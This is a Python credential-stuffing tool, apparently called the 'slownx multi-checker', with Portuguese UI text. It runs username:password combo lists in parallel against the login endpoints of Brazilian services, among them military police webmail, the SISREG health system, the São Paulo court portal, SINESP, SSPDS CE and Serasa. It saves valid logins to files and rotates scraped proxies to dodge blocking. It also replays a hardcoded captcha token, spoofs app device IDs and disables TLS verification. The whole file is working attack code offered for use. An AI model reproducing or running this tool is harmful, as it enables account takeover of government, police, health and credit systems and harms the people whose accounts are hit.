#!/usr/bin/env python3
import requests, sys, os, hashlib, threading, time, random, ssl, base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class _LegacyTLSAdapter(HTTPAdapter):
    """Alguns servidores (ex.: Serasa) recusam o handshake TLS padrão do
    OpenSSL 3.x (SECLEVEL=2). Baixar pra SECLEVEL=1 resolve o
    SSLV3_ALERT_HANDSHAKE_FAILURE; check_hostname/verify_mode são
    desligados aqui para evitar conflito ao usar verify=False."""

    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context(ciphers="DEFAULT@SECLEVEL=1")
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs["ssl_context"] = ctx
        return super().init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, *args, **kwargs):
        ctx = create_urllib3_context(ciphers="DEFAULT@SECLEVEL=1")
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs["ssl_context"] = ctx
        return super().proxy_manager_for(*args, **kwargs)

def _load_proxies(path='proxys.txt'):
    try:
        with open(path, 'r') as f:
            return [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        return []

_proxy_list    = _load_proxies()
_usar_proxy    = False

def _get_proxy():
    if not _usar_proxy or not _proxy_list:
        return None
    p = random.choice(_proxy_list)
    return {'http': f'http://{p}', 'https': f'http://{p}'}

G  = "\033[92m"
R  = "\033[91m"
Y  = "\033[93m"
C  = "\033[96m"
B  = "\033[94m"
BD = "\033[1m"
DM = "\033[2m"
X  = "\033[0m"

def clear(): os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print(f"""{C}{BD}
  ██████╗██╗      ██████╗ ██╗    ██╗███╗  ██╗██╗  ██╗
 ██╔════╝██║     ██╔═══██╗██║    ██║████╗ ██║╚██╗██╔╝
 ╚█████╗ ██║     ██║   ██║██║ █╗ ██║██╔██╗██║ ╚███╔╝
  ╚═══██╗██║     ██║   ██║██║███╗██║██║╚████║ ██╔██╗
 ██████╔╝███████╗╚██████╔╝╚███╔███╔╝██║ ╚███║██╔╝ ██╗
 ╚═════╝ ╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚══╝╚═╝  ╚═╝
{X}{DM}  ─────────────── multi-checker · by slownx ────────────{X}
""")

def menu():
    items = [
        ("1", "CheckOK",       "checkok.com.br"),
        ("2", "ConsultCenter", "consultcenter.com.br"),
        ("3", "Credicorp",     "confirmeonline.com.br"),
        ("4", "Correio PMSP",  "policiamilitar.sp.gov.br"),
        ("5", "SISREG III",    "sisregiii.saude.gov.br"),
        ("6", "TJSP",          "tjsp.jus.br"),
        ("7", "SSPDS CE",      "sspds.ce.gov.br"),
        ("8", "CheckONN",      "app.checkonn.com"),
        ("9", "Proxies BR",    "gerar + checar"),
        ("10","SINESP",        "seguranca.sinesp.gov.br"),
        ("0", "Sair",          ""),
    ]
    for num, nome, site in items:
        cor  = R if num == "0" else C
        info = f" {DM}{site}{X}" if site else ""
        print(f"  {cor}{BD}[{num}]{X}  {nome}{info}")
    print()

# ── locks ──────────────────────────────────────────────────────────────────────
print_lock = threading.Lock()
save_lock  = threading.Lock()

def log(tipo, user, pwd, extra=""):
    ex = f" {DM}› {extra}{X}" if extra else ""
    with print_lock:
        if tipo == "live":
            print(f"  {G}{BD}LIVE{X}  {G}{user}:{pwd}{X}{ex}")
        elif tipo == "die":
            print(f"  {R}DIE{X}   {DM}{user}:{pwd}{X}")
        else:
            print(f"  {Y}ERR{X}   {DM}{user}:{pwd}{X}{ex}")

def salvar(arquivo, user, pwd, extra=""):
    with save_lock:
        with open(arquivo, "a", encoding="utf-8") as f:
            f.write(f"{user}:{pwd}" + (f" | {extra}" if extra else "") + "\n")

def ler_db(path, dl):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [l.strip() for l in f if l.strip() and dl in l]

def parse(linha, dl):
    p = linha.split(dl, 1)
    return (p[0].strip(), p[1].strip()) if len(p) >= 2 else (None, None)

# ── runner ─────────────────────────────────────────────────────────────────────
def rodar(fn, lines, dl, workers, delay, saida):
    sem = threading.Semaphore(workers)

    def task(linha):
        user, pwd = parse(linha, dl)
        if not user or not pwd:
            return
        with sem:
            try:
                ok, msg = fn(user, pwd)
                if ok:
                    log("live", user, pwd, msg)
                    salvar(saida, user, pwd, msg)
                else:
                    log("die", user, pwd)
            except Exception:
                log("err", user, pwd, "timeout")
            finally:
                if delay:
                    time.sleep(delay)

    clear()
    banner()
    print(f"  {DM}checker  {X}{BD}{CONFIGS[_escolha][0]}{X}")
    print(f"  {DM}arquivo  {X}{BD}{saida}{X}")
    print(f"  {DM}contas   {X}{BD}{len(lines)}{X}")
    print(f"  {DM}threads  {X}{BD}{workers}{X}")
    print(f"\n  {DM}{'─' * 48}{X}\n")

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = [ex.submit(task, l) for l in lines]
        for f in as_completed(futures):
            f.result()

    print(f"\n  {DM}{'─' * 48}{X}")
    print(f"  {G}{BD}lives salvos em {saida}{X}\n")

# ── checkers ───────────────────────────────────────────────────────────────────
def check_checkok(user, pwd):
    r = requests.post(
        "https://bff.checkok.com.br/auth/rok",
        headers={"accept": "application/json, text/plain, */*",
                 "content-type": "application/json",
                 "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36"},
        data=f'{{"username": "{user}", "password": "{pwd}"}}',
        proxies=_get_proxy(), allow_redirects=False, timeout=15,
    )
    return "negado" not in r.text, ""

def check_consultcenter(user, pwd):
    s  = requests.Session()
    px = _get_proxy()
    r = s.post(
        "https://sistema.consultcenter.com.br/users/login",
        headers={"accept": "text/html,application/xhtml+xml,*/*",
                 "content-type": "application/x-www-form-urlencoded",
                 "origin": "https://sistema.consultcenter.com.br",
                 "referer": "https://sistema.consultcenter.com.br/users/login",
                 "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"},
        data=(
            "_method=POST"
            "&data%5B_Token%5D%5Bkey%5D=6433384afa2746bb58b2a03ca3e1311f4b80152b5a4105271287fd9ef9cc3c8cf954286b233895a7aeea65b78162811ea2d6ade92e08fa08b5e44a68db0718cd"
            f"&data%5BUsuarioLogin%5D%5Busername%5D={user}"
            f"&data%5BUsuarioLogin%5D%5Bpassword%5D={pwd}"
        ),
        proxies=px, timeout=15,
    )
    html = r.text.lower()
    if "senha incorretos" in html or "bloqueado" in html:
        return False, ""

    # The "faturas em aberto" alert is a CakePHP flash message: it only
    # renders once, on the page the login redirect lands on (r.text, since
    # requests follows redirects by default). A second GET to /portal
    # arrives after the flash was already consumed/cleared server-side.
    faturas = "faturas_abertoMessage" in r.text
    return True, "faturas em aberto" if faturas else "sem faturas em aberto"

def check_credicorp(user, pwd):
    r = requests.post(
        "https://credicorp-backend.confirmeonline.com.br/credicorp/api/user/authenticate",
        headers={"accept": "application/json, text/plain, */*",
                 "content-type": "application/json",
                 "user-agent": "Mozilla/5.0"},
        json={"login": user, "password": pwd, "productId": "84"},
        proxies=_get_proxy(), timeout=30,
    )
    details = r.json().get("details", [])
    if details and details[0].get("action", {}).get("temporaryToken"):
        return True, "token"
    return False, ""

def check_correiopmsp(user, pwd):
    r = requests.post(
        "https://correio.policiamilitar.sp.gov.br/names.nsf?Login",
        headers={"accept": "application/json, text/plain, */*",
                 "content-type": "application/json",
                 "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36"},
        data=(f"%25%25ModDate=0000000000000004&Username={user}&Password={pwd}"
              "&RedirectTo=%2F&Query_String_Decoded=Login&RedirectTo=%2F"
              "&ReasonText=&%24PublicAccess=1&reasonType=0"),
        proxies=_get_proxy(), allow_redirects=False, timeout=15,
    )
    return "Senha" not in r.text and "bloqueada" not in r.text, ""

def check_sisreg(user, pwd):
    h = hashlib.sha256(pwd.encode()).hexdigest()
    r = requests.post(
        "https://sisregiii.saude.gov.br/",
        headers={"accept": "text/html,application/xhtml+xml,*/*",
                 "content-type": "application/x-www-form-urlencoded",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"},
        data={"usuario": user, "senha": "", "senha_256": h, "etapa": "ACESSO", "logout": ""},
        proxies=_get_proxy(), allow_redirects=False, timeout=15,
    )
    div = BeautifulSoup(r.text, "html.parser").find("div", {"id": "mensagem"})
    msg = div.get_text(strip=True) if div else ""
    if "incorreto" in msg or "desativado" in msg:
        return False, ""
    return True, msg or f"status {r.status_code}"

def check_tjsp(user, pwd):
    PARAMS = {"ReturnUrl": ("/rhf/acesso/wsfederation?wtrealm=https%3a%2f%2fwww.tjsp.jus.br%2fRHF%2fPortalServidor%2f"
                            "&wctx=WsFedOwinState%3dZ3yVUTwekdJqiwXg49Psp9Uwsbk_KiM9ulcMcto47n8&wa=wsignin1.0")}
    HG = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/149.0.0.0 Mobile Safari/537.36",
          "Accept": "text/html,application/xhtml+xml,*/*"}
    HP = {**HG, "Content-Type": "application/x-www-form-urlencoded",
          "Origin": "https://www.tjsp.jus.br",
          "Referer": "https://www.tjsp.jus.br/rhf/acesso/Login/SignIn"}
    s   = requests.Session()
    px  = _get_proxy()
    pg  = s.get("https://www.tjsp.jus.br/rhf/acesso/Login/SignIn", params=PARAMS, headers=HG, proxies=px, timeout=30)
    inp = BeautifulSoup(pg.text, "html.parser").find("input", {"name": "__RequestVerificationToken"})
    if not inp:
        raise Exception("sem CSRF")
    resp = s.post("https://www.tjsp.jus.br/rhf/acesso/Login/SignIn", params=PARAMS, headers=HP,
                  data={"__RequestVerificationToken": inp["value"], "Usuario": user, "Senha": pwd, "Lembrar": "false"},
                  proxies=px, timeout=30, allow_redirects=False)
    return resp.status_code == 302 and "wsfederation" in resp.headers.get("Location", ""), ""

def check_sspds(user, pwd):
    H = {"accept": "text/html,application/xhtml+xml,*/*",
         "content-type": "application/x-www-form-urlencoded",
         "origin": "https://consulta.sspds.ce.gov.br",
         "referer": "https://consulta.sspds.ce.gov.br/consulta/index.do",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36"}
    s  = requests.Session()
    px = _get_proxy()
    s.get("https://consulta.sspds.ce.gov.br/consulta/index.do", headers=H, proxies=px, timeout=15, verify=False)
    r = s.post("https://consulta.sspds.ce.gov.br/consulta/logon.do", headers=H,
               data={"username": user, "password": pwd, "appNameBrowser": "Netscape", "submit": " OK "},
               proxies=px, timeout=15, verify=False)
    return any(k in r.text for k in ("logoff.do", "editSenha.do", "consultaNomeForm")), ""

_SINESP_DISPOSITIVO = '2412DPC0AG'
_SINESP_INSTALACAO  = 'ed5f8007-7d67-409f-afce-2e8fc7e7e059'

def check_sinesp(user, pwd):
    import urllib3 as _ul3, gzip as _gz, json as _js
    digits  = ''.join(filter(str.isdigit, user))
    usuario = digits if len(digits) == 11 else user
    body = _js.dumps({
        'aplicativo': 'APP_AGENTE_CAMPO',
        'dispositivo': _SINESP_DISPOSITIVO,
        'instalacao':  _SINESP_INSTALACAO,
        'senha':       pwd,
        'usuario':     usuario,
    }, separators=(',', ':')).encode('utf-8')
    http = _ul3.HTTPSConnectionPool(
        'seguranca.sinesp.gov.br', port=443,
        cert_reqs='CERT_NONE', assert_hostname=False,
        timeout=_ul3.Timeout(connect=15, read=30),
    )
    resp = http.urlopen(
        'POST',
        '/sinesp-seguranca/api/sessao_autenticada/mobile',
        body=body,
        headers={
            'host':           'seguranca.sinesp.gov.br',
            'content-type':   'application/json; charset=UTF-8',
            'content-length': str(len(body)),
            'accept-encoding':'gzip',
            'user-agent':     'okhttp/3.14.9',
        },
        preload_content=True,
    )
    raw  = resp.data
    if resp.headers.get('content-encoding') == 'gzip':
        raw = _gz.decompress(raw)
    text  = raw.decode('utf-8', errors='replace')
    if 'MOB411' in text:
        return False, ""
    data  = _js.loads(text)
    token = data.get('token')
    if resp.status == 200 and token and token != 'null':
        return True, f"token:{str(token)[:20]}..."
    return False, ""

_CHECKONN_CAPTCHA = '0cAFcWeA6-VItkOKwH4qO_GB7Tf2ftDzZmkLq9WNjes3aFQ_Z1zsy582pFybIczVJxtnQTBUYhw6_ASRtuCat2cR9snyQMXQKjwFEQuhMtxaeoUuZvrjLixEGqY0P6SA6tc_3lmJimjf7qLRq9CLB2pnKFwYkFQtspKxH-1u6b07bfGSknadx8nTYWwq4GukxCkQ_pLMZpHSMECs9WWbz2bLiu0H_8CE1W7JqEU7efXyD7Dluca4J15UKjRF6idEXHntWdRR27CGxSKBcg42LG_d4PQ53a7IiqnGX4fiUQ7sZzIocvB2AO4xD4TedEVU5fqkmkjWwnsP6wH9nlKoOUN9tPzFvaTfU4rj1hTzMoDTWcjACynuK64qNDzYOBvcXHISvQILPdncxM8nuc-BdjDWL2-3u87v2pp4eHoWcqqM4m3zVw1HBb5T7G-ZzhTh7QCKW-WbfTMxfCB2HBIxN-eKD8OeYek2fLzEnAPekhT3ZB26ct3enKBG83sQpa1lM1827665O3uBnvcnN1SR8jy5ZFHBbiy1bq0-HUWUgyyGvhUXi7CfK7wd-nvhshyXfy_FB1JbdAvbMsi4KcdMQaIP1C9b_hOyypMheCGclhOS6j7stRvgWp1wPpGB_6HAv75YkWwdC6BW49xMHosaiyRygpmsBLFSjzjvBAa3cK65oUetEO27PVwkTbAebJljMSloY8GongiEe25af8pXVuR3HT20GmwWzUGne38QTlYjPPuk7QywxQ7qDkxXFu18dj5MCYYSWo6H-0A0WeUtE2jqesDa0DPP8pWbz00Vwv530h99FpSvXPLrjCKZPpNmLxyWe4w4ObvCIDI2rP-l9C0sz5pywfE5HzbiPX-B1tNNvIXd_QDB8ahT39QVhtuRDfWyNBIMz3cMNEmstLImunhhi6ozvMQf-OKGhQAIAxeJtmlyx7MQwCIIEjKNDWSFIe6EifyqAnRr8ihdA-KMVv8BLZWTBEDBqMVU79LOHhfhXt6WHWRZ63M1HVhTfXZuUTZw1cf3X8scETgH5ES0bMCkKFw15sZ5befhDMc67uZJqqZACd07dYrP0Tif0XqtJPFv5LdWxbrmzdJSzeJUT2mYggOi8MjwcZV0emn70HL5oN5ZsPZZYIconImo6TXZkYvjveKHlhPIx0tSYkxDmg9c9FwZWqzkeOr2876QY7fZKY46wyhpgmPKO68HCudmUmE8iauQwbzQz1s_fCcWKCOEgQ6C3QP7YLKgp1yU4b0R16OhcdIHUJLH3wyAqxwsin6e5ly0sPt4XANa7VtM2xHkheOlK3ttu5qWPbmcWgPrQuiosmwoYQYMY0CfibTvvQShzFLWk8coZBBcvTEjfi-_vz6gSwc0r_lgEIrf_21CRs9xACr8E3qj92q2WAR57wtIDNmb8a6h4BLP0_ZF9BgF2coD2ry5KqL_OkVCvfJpTekw0tWB_xIWo_xzM01KiNOgYJ2bYZxiMdTXtSuwP2eKvYqlEfNC01lpXi22yT-uAzoQx-UVuC9ir0rY45jnJiW4RrJ2MMG_yATZO3mmEVp5c2uiX2ys7OVx39mAnCUTDBdyPRIl_GnNFCPYjlUlJt6r5hTT4mR7YkfXt_BygxGtir0CZXpTGQyxoqaCyh01XjDrAJ298Ca9mqa57o7dhgCbSpYen4A8wjXBT7fFC8YOxkBhxY5Sk4gZMSNVb0zk_ZLfiKbS7aHjJQT23kJQEH7R7CLYA3zfnJRe2lf2gnaI02lRzP5asPEMcKwtO0gGkK_yi9NuDP4mNSBrjyeimmITgjXwKr_Zntct8zbD7UKIaG81dqCcQ61kZCbZKeMPaXkBNKgV2J5V_RLpTABx0kAsHSqQaUPcrr_rD--u-v7BFqsg6rOmR_Ou2X0Pp_iU-nzFrIKlvKzGAxHAc3QLRf0zUY2Z2dwrMXV21X7G0LG3kPy6p77vtkGr6TXLmbvvpWvJW1ZvIjl1g5rU0PW9xQEwQvni0_oh2U_4YsMD9ERFyV_1TiDUXDZH3RzJScs-fNHqrr3sdEQGKbuQDcfXSvt6YshWKdgkqyHfYXotlktshX6J0Sns2GlK2xoJ9Q4tVnW1--tvGtlgcZUG3bnA4k2gU605YWXz01S1cR66D_1vGOo_mVRrX5FjP8HwoQbJfdCjX43hPDlOmv3_FpStwuZTS1Nb3lpu3K'

def check_checkonn(user, pwd):
    H = {'User-Agent':                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
         'accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language':           'pt-BR,pt;q=0.9',
         'origin':                    'https://app.checkonn.com',
         'referer':                   'https://app.checkonn.com/intranet/login.php',
         'upgrade-insecure-requests': '1'}
    s  = requests.Session()
    px = _get_proxy()
    s.headers.update(H)
    s.get('https://app.checkonn.com/', proxies=px, timeout=10, verify=False)
    s.get('https://app.checkonn.com/intranet/login.php', proxies=px, timeout=10, verify=False)
    r = s.post('https://app.checkonn.com/intranet/login.php',
               data={'login': user, 'senha': pwd, 'logar': 'true',
                     'g-recaptcha-response': _CHECKONN_CAPTCHA, 'loginEsqueci': ''},
               proxies=px, timeout=10, verify=False, allow_redirects=True)
    is_die = ('Senha inválida.' in r.text or 'tentativas restantes!' in r.text
              or 'Login inválido' in r.text or 'login bloqueado!' in r.text.lower())
    return not is_die and r.status_code == 200, ""

def check_serasa(user, pwd):
    basic = base64.b64encode(f"{user}:{pwd}".encode()).decode()
    s = requests.Session()
    s.mount('https://', _LegacyTLSAdapter())
    r = s.post(
        'https://sitenet.serasa.com.br/security/iam/v1/user-identities/login?clientId=5ecebf45aae366236fd0b584',
        headers={
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'pt-BR,pt;q=0.9',
            'Authorization': f'Basic {basic}',
            'Content-Type': 'application/json',
            'Origin': 'https://empresas.serasaexperian.com.br',
            'Referer': 'https://empresas.serasaexperian.com.br/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
        },
        json={'deviceId': '6a4442efb2b2e725cb1a4551', 'deviceVersion': 'V2'},
        proxies=_get_proxy(), timeout=15, verify=False,
    )
    data  = r.json()
    token = data.get('accessToken')
    if token and token != 'null':
        return True, f"token:{str(token)[:20]}..."
    return False, ""

# ── proxy manager ──────────────────────────────────────────────────────────────
_PROXY_FONTES_TXT = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=BR&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=BR",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=BR",
    "https://www.proxy-list.download/api/v1/get?type=http&country=BR",
    "https://www.proxy-list.download/api/v1/get?type=https&country=BR",
    "https://www.proxy-list.download/api/v1/get?type=socks4&country=BR",
    "https://www.proxy-list.download/api/v1/get?type=socks5&country=BR",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
]

_PROXY_FONTES_JSON = [
    "https://proxylist.geonode.com/api/proxy-list?country=BR&limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http,https,socks4,socks5",
    "https://proxylist.geonode.com/api/proxy-list?country=BR&limit=500&page=2&sort_by=lastChecked&sort_type=desc&protocols=http,https,socks4,socks5",
]

def _buscar_proxies_br():
    proxies = set()

    for url in _PROXY_FONTES_TXT:
        try:
            r = requests.get(url, timeout=15)
            for line in r.text.strip().splitlines():
                line = line.strip()
                if ':' in line and line.count('.') == 3:
                    proxies.add(line)
        except Exception:
            pass

    for url in _PROXY_FONTES_JSON:
        try:
            r = requests.get(url, timeout=15)
            data = r.json().get('data', [])
            for item in data:
                ip   = item.get('ip', '')
                port = item.get('port', '')
                if ip and port:
                    proxies.add(f"{ip}:{port}")
        except Exception:
            pass

    return list(proxies)

def _checar_proxy(proxy):
    try:
        r = requests.get(
            'https://api.ipify.org',
            proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'},
            timeout=8,
        )
        return r.status_code == 200
    except Exception:
        return False

def rodar_proxy_manager(saida='proxys.txt'):
    clear()
    banner()
    print(f"  {C}{BD}Proxies BR{X}\n")
    print(f"  {Y}Buscando proxies nas fontes...{X}")

    proxies = _buscar_proxies_br()
    total   = len(proxies)
    print(f"  {G}Encontrados: {total}{X}")

    if not total:
        print(f"  {R}Nenhum proxy encontrado.{X}\n")
        return

    print(f"  {Y}Checando {total} proxies...{X}\n")
    print(f"  {DM}{'─' * 48}{X}\n")

    vivos   = []
    mortos  = 0
    p_lock  = threading.Lock()
    cnt     = [0]

    def check(proxy):
        ok = _checar_proxy(proxy)
        with p_lock:
            cnt[0] += 1
            if ok:
                vivos.append(proxy)
                print(f"  {G}{BD}LIVE{X}  {G}{proxy}{X}  {DM}[{cnt[0]}/{total}]{X}")
            else:
                print(f"  {R}DIE{X}   {DM}{proxy}  [{cnt[0]}/{total}]{X}")

    with ThreadPoolExecutor(max_workers=80) as ex:
        futures = [ex.submit(check, p) for p in proxies]
        for f in as_completed(futures):
            try:
                f.result()
            except Exception:
                pass

    with open(saida, 'w', encoding='utf-8') as f:
        f.write('\n'.join(vivos))

    print(f"\n  {DM}{'─' * 48}{X}")
    print(f"  {G}{BD}{len(vivos)} proxies vivos salvos em {saida}{X}\n")

# ── config ─────────────────────────────────────────────────────────────────────
CONFIGS = {
    "1": ("CheckOK",       check_checkok,       "live_checkok.txt",       3, 0.5),
    "2": ("ConsultCenter", check_consultcenter, "live_consultcenter.txt", 5, 0.3),
    "3": ("Credicorp",     check_credicorp,     "live_credicorp.txt",     5, 0.2),
    "4": ("Correio PMSP",  check_correiopmsp,   "live_correiopmsp.txt",   3, 0.5),
    "5": ("SISREG III",    check_sisreg,        "live_sisreg.txt",        5, 0.3),
    "6": ("TJSP",          check_tjsp,          "live_tjsp.txt",          5, 0.5),
    "7": ("SSPDS CE",      check_sspds,         "live_sspds.txt",         5, 0.3),
    "8":  ("CheckONN",      check_checkonn,      "live_checkonn.txt",      5, 0.3),
    "10": ("SINESP",        check_sinesp,        "live_sinesp.txt",        5, 0.3),
    "11": ("Serasa Empresas", check_serasa,      "live_serasa.txt",        5, 0.3),
}

# ── main ───────────────────────────────────────────────────────────────────────
# uso: python3 slownx_checker.py [opção] [arquivo] [delimitador] [threads]
_escolha = None

def main():
    global _escolha

    arg_op  = sys.argv[1] if len(sys.argv) > 1 else None
    arg_db  = sys.argv[2] if len(sys.argv) > 2 else None
    arg_dl  = sys.argv[3] if len(sys.argv) > 3 else None
    arg_th  = sys.argv[4] if len(sys.argv) > 4 else None

    banner()
    menu()

    if arg_op and arg_op in CONFIGS:
        _escolha = arg_op
        print(f"  {C}{BD}[{_escolha}]{X}")
    else:
        _escolha = input(f"  {C}{BD}›{X} ").strip()

    if _escolha == "9":
        rodar_proxy_manager()
        return

    if _escolha == "0" or _escolha not in CONFIGS:
        print(f"\n  {Y}saindo...{X}\n")
        sys.exit(0)

    nome, fn, saida, w_def, delay = CONFIGS[_escolha]

    print(f"\n  {DM}checker  {X}{BD}{nome}{X}")

    if arg_db:
        db = arg_db
        print(f"  {DM}arquivo  {X}{BD}{db}{X}")
    else:
        db = input(f"  {DM}arquivo  {X}").strip() or "resultado.txt"

    if arg_dl:
        dl = arg_dl
    else:
        dl_in = input(f"  {DM}delimitador {X}{DM}[:]{X} ").strip()
        dl = dl_in or ":"

    if arg_th and arg_th.isdigit():
        workers = int(arg_th)
    else:
        th_in = input(f"  {DM}threads  {X}{DM}[{w_def}]{X} ").strip()
        workers = int(th_in) if th_in.isdigit() else w_def

    global _usar_proxy
    if _proxy_list:
        px_in = input(f"  {DM}proxy    {X}{DM}[s/N]{X} ").strip().lower()
        _usar_proxy = px_in in ('s', 'sim', 'y', 'yes')
        status_px = f"{G}ativo ({len(_proxy_list)} proxies){X}" if _usar_proxy else f"{R}desativado{X}"
        print(f"  {DM}proxy    {X}{status_px}")
    else:
        print(f"  {DM}proxy    {X}{Y}proxys.txt não encontrado{X}")

    if not os.path.exists(db):
        print(f"\n  {R}arquivo '{db}' não encontrado.{X}\n")
        sys.exit(1)

    lines = ler_db(db, dl)
    if not lines:
        print(f"\n  {Y}nenhuma linha válida.{X}\n")
        sys.exit(0)

    rodar(fn, lines, dl, workers, delay, saida)

if __name__ == "__main__":
    main()
